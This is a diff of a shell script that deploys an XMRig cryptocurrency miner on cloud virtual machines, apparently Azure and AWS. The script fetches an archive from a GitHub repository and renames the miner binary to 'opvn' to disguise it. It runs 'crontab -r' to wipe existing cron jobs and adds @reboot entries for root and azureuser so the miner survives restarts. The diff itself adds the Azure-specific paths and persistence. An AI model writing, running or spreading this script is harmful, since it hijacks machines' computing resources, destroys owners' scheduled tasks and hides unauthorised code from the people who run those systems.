@@ -1,4 +1,4 @@
-cd /home/*/
+cd /home/azureuser/
 wget https://github.com/bondbenz1821/opme/raw/main/opme.tar.gz
 tar -xzsf opme.tar.gz
 mv xmrig* opvn
@@ -33,7 +33,7 @@ crontab -r
 (crontab -u root -l; echo "@reboot cd /home/*/opvn && ./cronjob.sh" ) | crontab -u root -
 
 # this cron for aws but not use
-#(crontab -u ubuntu -l; echo "@reboot cd /home/ubuntu/opvn && ./cronjob.sh" ) | crontab -u ubuntu -
+(crontab -u azureuser -l; echo "@reboot cd /home/azureuser/opvn && ./cronjob.sh" ) | crontab -u azureuser -
 chmod +x opvn
 sudo ./opvn 2>&1 &
 
